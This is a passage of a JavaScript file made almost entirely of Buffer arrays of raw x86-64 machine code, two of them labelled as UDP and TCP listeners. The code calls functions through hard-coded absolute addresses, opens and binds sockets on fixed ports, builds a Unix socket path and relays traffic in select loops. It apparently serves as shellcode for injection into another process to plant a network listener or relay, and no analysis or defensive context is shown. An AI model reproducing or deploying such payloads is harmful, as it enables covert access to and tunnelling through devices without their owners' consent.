	0x45, 0x98, 0x83, 0x7D, 0x98, 0xFF, 0x75, 0x28, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8B, 
	0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 0xC8, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 
	0xB0, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x3B, 0x04, 0x00, 0x00, 
	0x48, 0xC7, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x78, 0xFF, 
	0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x02, 0x00, 0xC7, 
	0x85, 0x74, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE0, 0xBF, 0x50, 0x00, 
	0x00, 0x00, 0xFF, 0xD0, 0x66, 0x89, 0x85, 0x72, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x8D, 0x70, 0xFF, 
	0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x45, 0xC0, 0xBA, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 
	0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x9C, 0x83, 0x7D, 0x9C, 0x00, 0x74, 0x28, 0x48, 
	0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 
	0xC8, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xB0, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0xB8, 0x00, 0x00, 
	0x00, 0x00, 0xE9, 0xB4, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x03, 0x00, 
	0x00, 0x00, 0x48, 0xC7, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 
	0x60, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x4D, 0xA8, 0x41, 0xB8, 0x10, 0x00, 0x00, 
	0x00, 0x48, 0x89, 0xD1, 0xBA, 0x15, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 
	0x41, 0xFF, 0xD1, 0x48, 0x8D, 0x95, 0x60, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x4D, 
	0xA8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x14, 0x00, 0x00, 0x00, 0xBE, 
	0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 
	0x8D, 0x95, 0x60, 0xFF, 0xFF, 0xFF, 0x4C, 0x8B, 0x4D, 0xA8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 
	0x48, 0x89, 0xD1, 0xBA, 0x15, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 
	0xFF, 0xD1, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8D, 0x95, 0x60, 0xFF, 0xFF, 0xFF, 0x4C, 
	0x8B, 0x4D, 0xA8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x14, 0x00, 0x00, 
	0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0xC7, 0x85, 0x50, 0xFF, 
	0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x58, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 
	0x00, 0x66, 0xC7, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0x02, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x8B, 
	0x40, 0x10, 0x8B, 0x00, 0x89, 0x85, 0x54, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x8B, 
	0x40, 0x10, 0x8B, 0x40, 0x04, 0x66, 0x89, 0x85, 0x52, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x8D, 0x50, 
	0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x45, 0xD8, 0xBA, 0x10, 0x00, 0x00, 0x00, 0x48, 
	0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x9C, 0x83, 0x7D, 0x9C, 0x00, 0x74, 0x33, 
	0x8B, 0x45, 0x98, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 
	0x00, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 0xC8, 0xEE, 0xFF, 0xFF, 
	0x48, 0x8B, 0x55, 0xB0, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x68, 
	0x02, 0x00, 0x00, 0xC7, 0x45, 0x94, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 
	0x39, 0x45, 0x98, 0x7F, 0x08, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0xEB, 0x03, 0x8B, 0x45, 0x98, 
	0x89, 0x45, 0x90, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x10, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 
	0xD0, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 0xD7, 0xFC, 0xF3, 0x48, 0xAB, 0x89, 0xF8, 0x89, 0xCA, 0x89, 
	0x55, 0x8C, 0x89, 0x45, 0x88, 0x8B, 0x45, 0x98, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 
	0xC1, 0xF8, 0x06, 0x89, 0xC6, 0x48, 0x63, 0xC6, 0x48, 0x8B, 0xBC, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 
	0x8B, 0x45, 0x98, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 
	0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x09, 0xC7, 0x48, 0x89, 
	0xFA, 0x48, 0x63, 0xC6, 0x48, 0x89, 0x94, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 0x45, 0xF8, 
	0x8B, 0x00, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x89, 0xC6, 0x48, 
	0x63, 0xC6, 0x48, 0x8B, 0xBC, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 
	0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 
	0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x09, 0xC7, 0x48, 0x89, 0xFA, 0x48, 0x63, 
	0xC6, 0x48, 0x89, 0x94, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x90, 0x8D, 0x78, 0x01, 0x48, 
	0x8D, 0x85, 0xD0, 0xEE, 0xFF, 0xFF, 0x4C, 0x8B, 0x4D, 0xA0, 0x41, 0xB8, 0x00, 0x00, 0x00, 0x00, 
	0xB9, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC6, 0x41, 0xFF, 0xD1, 
	0x89, 0x45, 0x9C, 0x83, 0x7D, 0x9C, 0x00, 0x0F, 0x8E, 0xFD, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 
	0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x48, 0x98, 0x48, 0x8B, 0xB4, 
	0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 
	0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 
	0x48, 0x21, 0xF0, 0x48, 0x85, 0xC0, 0x74, 0x5B, 0x8B, 0x45, 0x94, 0x8D, 0x50, 0xFF, 0x48, 0x8D, 
	0xB5, 0x50, 0xEF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 0x8B, 0x45, 0xC8, 0xB9, 0x00, 0x00, 0x00, 
	0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x84, 0x83, 0x7D, 0x84, 0x00, 0x0F, 0x8E, 0xC8, 
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x8B, 0x55, 0x84, 0x48, 0x8D, 0xB5, 0x50, 
	0xEF, 0xFF, 0xFF, 0x4C, 0x8B, 0x45, 0xD0, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 
	0xD0, 0x89, 0x45, 0x80, 0x83, 0x7D, 0x80, 0x00, 0x0F, 0x8F, 0x6C, 0xFE, 0xFF, 0xFF, 0xE9, 0x9F, 
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 
	0xC2, 0xC1, 0xF8, 0x06, 0x48, 0x98, 0x48, 0x8B, 0xB4, 0xC5, 0xD0, 0xEE, 0xFF, 0xFF, 0x48, 0x8B, 
	0x45, 0xF8, 0x8B, 0x00, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 
	0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x21, 0xF0, 0x48, 
	0x85, 0xC0, 0x0F, 0x84, 0x22, 0xFE, 0xFF, 0xFF, 0x8B, 0x45, 0x94, 0x8D, 0x50, 0xFF, 0x48, 0x8B, 
	0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8D, 0xB5, 0x50, 0xEF, 0xFF, 0xFF, 0x4C, 0x8B, 0x45, 0xC8, 0xB9, 
	0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x84, 0x83, 0x7D, 0x84, 0x00, 
	0x7E, 0x2C, 0x8B, 0x55, 0x84, 0x48, 0x8D, 0xB5, 0x50, 0xEF, 0xFF, 0xFF, 0x8B, 0x45, 0x98, 0x4C, 
	0x8B, 0x45, 0xD0, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x89, 0x45, 0x80, 
	0x83, 0x7D, 0x80, 0x00, 0x7E, 0x0B, 0xE9, 0xCF, 0xFD, 0xFF, 0xFF, 0x90, 0xEB, 0x04, 0x90, 0xEB, 
	0x01, 0x90, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 
	0x8B, 0x45, 0x98, 0x48, 0x8B, 0x55, 0xB8, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 0xC8, 0xEE, 
	0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xB0, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0xC9, 0xC3, 0xE9, 0x9E, 0x00

]);


const g_udp_listener = Buffer.from([

	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x10, 0x00, 0x00, 0x48, 
	0x83, 0x0C, 0x24, 0x00, 0x48, 0x81, 0xEC, 0x30, 0x02, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xD8, 0xED, 
	0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xD8, 0xED, 0xFF, 0xFF, 0x48, 0x89, 0x45, 0xF8, 0x48, 0x8B, 0x45, 
	0xF8, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x45, 0xF0, 0xB8, 0xF0, 0x57, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xE8, 0xB8, 0x00, 0x71, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 
	0xE0, 0xB8, 0x70, 0x6A, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xD8, 0xB8, 0xF0, 0x50, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xD0, 0xB8, 0x98, 0x52, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xC8, 0xB8, 0xB8, 0x38, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 
	0xC0, 0xB8, 0x00, 0x4F, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xB8, 0xB8, 0x28, 0x28, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xB0, 0xB8, 0xF8, 0x4B, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xA8, 0xC7, 0x45, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE8, 
	0xBA, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x02, 0x00, 0x00, 0x00, 0xBF, 0x01, 0x00, 0x00, 0x00, 0xFF, 
	0xD0, 0x89, 0x45, 0xA0, 0x83, 0x7D, 0xA0, 0xFF, 0x75, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 
	0x8E, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE8, 0xBA, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x02, 0x00, 
	0x00, 0x00, 0xBF, 0x02, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x89, 0x45, 0x9C, 0x83, 0x7D, 0x9C, 0xFF, 
	0x75, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x66, 0x04, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x70, 
	0xFF, 0xFF, 0xFF, 0x03, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 
	0x00, 0x00, 0x48, 0x8D, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x4C, 0x8B, 0x4D, 0xB8, 
	0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x15, 0x00, 0x00, 0x00, 0xBE, 0x01, 
	0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0x8D, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x8B, 
	0x45, 0xA0, 0x4C, 0x8B, 0x4D, 0xB8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 
	0x14, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0x8D, 
	0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x4C, 0x8B, 0x4D, 0xB8, 0x41, 0xB8, 0x10, 0x00, 
	0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x15, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 
	0xC7, 0x41, 0xFF, 0xD1, 0x48, 0x8D, 0x95, 0x70, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x4C, 0x8B, 
	0x4D, 0xB8, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xBA, 0x14, 0x00, 0x00, 0x00, 
	0xBE, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD1, 0x48, 0xC7, 0x85, 0x60, 0xFF, 0xFF, 
	0xFF, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 
	0x66, 0xC7, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x02, 0x00, 0xC7, 0x85, 0x64, 0xFF, 0xFF, 0xFF, 0x00, 
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE0, 0xBF, 0xA1, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x66, 0x89, 
	0x85, 0x62, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x8D, 0x60, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x4C, 
	0x8B, 0x45, 0xD8, 0xBA, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 
	0x89, 0x45, 0xA4, 0x83, 0x7D, 0xA4, 0x00, 0x74, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x4F, 
	0x03, 0x00, 0x00, 0x66, 0xC7, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0x01, 0x00, 0xC6, 0x85, 0xF2, 0xFE, 
	0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0xF3, 0xFE, 0xFF, 0xFF, 0x75, 0xC6, 0x85, 0xF4, 0xFE, 0xFF, 0xFF, 
	0x6D, 0xC6, 0x85, 0xF5, 0xFE, 0xFF, 0xFF, 0x69, 0xC6, 0x85, 0xF6, 0xFE, 0xFF, 0xFF, 0x64, 0xC6, 
	0x85, 0xF7, 0xFE, 0xFF, 0xFF, 0x73, 0xC6, 0x85, 0xF8, 0xFE, 0xFF, 0xFF, 0x75, 0xC6, 0x85, 0xF9, 
	0xFE, 0xFF, 0xFF, 0x00, 0x48, 0x8D, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x50, 0x02, 0x48, 
	0x8B, 0x45, 0xB0, 0x48, 0x89, 0xD7, 0xFF, 0xD0, 0x48, 0x8D, 0x8D, 0xF0, 0xFE, 0xFF, 0xFF, 0x8B, 
	0x45, 0xA0, 0x4C, 0x8B, 0x45, 0xD8, 0xBA, 0x6E, 0x00, 0x00, 0x00, 0x48, 0x89, 0xCE, 0x89, 0xC7, 
	0x41, 0xFF, 0xD0, 0x89, 0x45, 0xA4, 0x83, 0x7D, 0xA4, 0x00, 0x74, 0x0A, 0xB8, 0x00, 0x00, 0x00, 
	0x00, 0xE9, 0xCC, 0x02, 0x00, 0x00, 0xC7, 0x45, 0x98, 0x00, 0x10, 0x00, 0x00, 0xB8, 0x00, 0x00, 
	0x00, 0x00, 0xB9, 0x10, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0x70, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 
	0xD7, 0xFC, 0xF3, 0x48, 0xAB, 0x89, 0xF8, 0x89, 0xCA, 0x89, 0x55, 0x94, 0x89, 0x45, 0x90, 0x8B, 
	0x45, 0xA0, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 0x89, 0xC6, 0x48, 
	0x63, 0xC6, 0x48, 0x8B, 0xBC, 0xC5, 0x70, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x99, 0xC1, 0xEA, 
	0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 
	0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x09, 0xC7, 0x48, 0x89, 0xFA, 0x48, 0x63, 0xC6, 0x48, 0x89, 
	0x94, 0xC5, 0x70, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 
	0xC2, 0xC1, 0xF8, 0x06, 0x89, 0xC6, 0x48, 0x63, 0xC6, 0x48, 0x8B, 0xBC, 0xC5, 0x70, 0xEE, 0xFF, 
	0xFF, 0x8B, 0x45, 0x9C, 0x99, 0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 
	0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x09, 0xC7, 0x48, 
	0x89, 0xFA, 0x48, 0x63, 0xC6, 0x48, 0x89, 0x94, 0xC5, 0x70, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 
	0x3B, 0x45, 0x9C, 0x7E, 0x05, 0x8B, 0x45, 0xA0, 0xEB, 0x03, 0x8B, 0x45, 0x9C, 0x89, 0x45, 0x8C, 
	0x8B, 0x45, 0x8C, 0x8D, 0x78, 0x01, 0x48, 0x8D, 0x85, 0x70, 0xEE, 0xFF, 0xFF, 0x4C, 0x8B, 0x4D, 
	0xA8, 0x41, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 
	0x00, 0x48, 0x89, 0xC6, 0x41, 0xFF, 0xD1, 0x89, 0x45, 0xA4, 0x83, 0x7D, 0xA4, 0x00, 0x0F, 0x8E, 
	0x09, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 
	0xF8, 0x06, 0x48, 0x98, 0x48, 0x8B, 0xB4, 0xC5, 0x70, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x99, 
	0xC1, 0xEA, 0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 
	0xC1, 0x48, 0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x21, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xAF, 
	0x00, 0x00, 0x00, 0xC7, 0x85, 0xEC, 0xED, 0xFF, 0xFF, 0x6E, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x98, 
	0x83, 0xE8, 0x01, 0x48, 0x63, 0xD0, 0x48, 0x8D, 0xBD, 0xEC, 0xED, 0xFF, 0xFF, 0x48, 0x8D, 0x8D, 
	0x00, 0xEE, 0xFF, 0xFF, 0x48, 0x8D, 0xB5, 0xF0, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 0x4C, 0x8B, 
	0x55, 0xC8, 0x49, 0x89, 0xF9, 0x49, 0x89, 0xC8, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 
	0xFF, 0xD2, 0x89, 0x45, 0x88, 0x83, 0x7D, 0x88, 0x00, 0x0F, 0x8E, 0x26, 0x01, 0x00, 0x00, 0x66, 
	0xC7, 0x85, 0xF0, 0xED, 0xFF, 0xFF, 0x02, 0x00, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x00, 0x89, 0x85, 
	0xF4, 0xED, 0xFF, 0xFF, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x40, 0x04, 0x66, 0x89, 0x85, 0xF2, 0xED, 
	0xFF, 0xFF, 0x8B, 0x45, 0x88, 0x48, 0x63, 0xD0, 0x48, 0x8D, 0x8D, 0xF0, 0xED, 0xFF, 0xFF, 0x48, 
	0x8D, 0xB5, 0xF0, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x4C, 0x8B, 0x55, 0xC0, 0x41, 0xB9, 0x10, 
	0x00, 0x00, 0x00, 0x49, 0x89, 0xC8, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD2, 
	0x89, 0x45, 0x84, 0x83, 0x7D, 0x84, 0x00, 0x0F, 0x8F, 0x20, 0xFE, 0xFF, 0xFF, 0xE9, 0xCA, 0x00, 
	0x00, 0x00, 0x8B, 0x45, 0x9C, 0x8D, 0x50, 0x3F, 0x85, 0xC0, 0x0F, 0x48, 0xC2, 0xC1, 0xF8, 0x06, 
	0x48, 0x98, 0x48, 0x8B, 0xB4, 0xC5, 0x70, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x99, 0xC1, 0xEA, 
	0x1A, 0x01, 0xD0, 0x83, 0xE0, 0x3F, 0x29, 0xD0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x89, 0xC1, 0x48, 
	0xD3, 0xE2, 0x48, 0x89, 0xD0, 0x48, 0x21, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xDC, 0xFD, 0xFF, 
	0xFF, 0xC7, 0x85, 0xE8, 0xED, 0xFF, 0xFF, 0x10, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x98, 0x83, 0xE8, 
	0x01, 0x48, 0x63, 0xD0, 0x48, 0x8D, 0xBD, 0xE8, 0xED, 0xFF, 0xFF, 0x48, 0x8D, 0x8D, 0xF0, 0xED, 
	0xFF, 0xFF, 0x48, 0x8D, 0xB5, 0xF0, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0x9C, 0x4C, 0x8B, 0x55, 0xC8, 
	0x49, 0x89, 0xF9, 0x49, 0x89, 0xC8, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD2, 
	0x89, 0x45, 0x88, 0x83, 0x7D, 0x88, 0x00, 0x7E, 0x3F, 0x8B, 0x45, 0x88, 0x48, 0x63, 0xD0, 0x48, 
	0x8D, 0x8D, 0x00, 0xEE, 0xFF, 0xFF, 0x48, 0x8D, 0xB5, 0xF0, 0xEE, 0xFF, 0xFF, 0x8B, 0x45, 0xA0, 
	0x4C, 0x8B, 0x55, 0xC0, 0x41, 0xB9, 0x6E, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC8, 0xB9, 0x00, 0x00, 
	0x00, 0x00, 0x89, 0xC7, 0x41, 0xFF, 0xD2, 0x89, 0x45, 0x84, 0x83, 0x7D, 0x84, 0x00, 0x7E, 0x0B, 
	0xE9, 0x58, 0xFD, 0xFF, 0xFF, 0x90, 0xEB, 0x04, 0x90, 0xEB, 0x01, 0x90, 0x8B, 0x45, 0x9C, 0x48, 
	0x8B, 0x55, 0xD0, 0x89, 0xC7, 0xFF, 0xD2, 0x8B, 0x45, 0xA0, 0x48, 0x8B, 0x55, 0xD0, 0x89, 0xC7, 
	0xFF, 0xD2, 0xC9, 0xC3, 0xE9, 0x97, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00
]);


const g_tcp_listener = Buffer.from([
	0xF3, 0x0F, 0x1E, 0xFA, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x40, 0x01, 0x00, 0x00, 0x48, 
	0x89, 0xBD, 0xC8, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0xC8, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x45, 
	0xF8, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x45, 0xF0, 0xB8, 0xF0, 0x57, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xE8, 0xB8, 0x00, 0x71, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xE0, 0xB8, 0x18, 0x56, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 
	0xD8, 0xB8, 0x08, 0x55, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xD0, 0xB8, 0xD8, 0x40, 
	0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xC8, 0xB8, 0x70, 0x6A, 0x29, 0x04, 0x48, 0x8B, 
	0x00, 0x48, 0x89, 0x45, 0xC0, 0xB8, 0xB8, 0x71, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 
	0xB8, 0xB8, 0x48, 0x66, 0x29, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xB0, 0xB8, 0xF0, 0x50, 
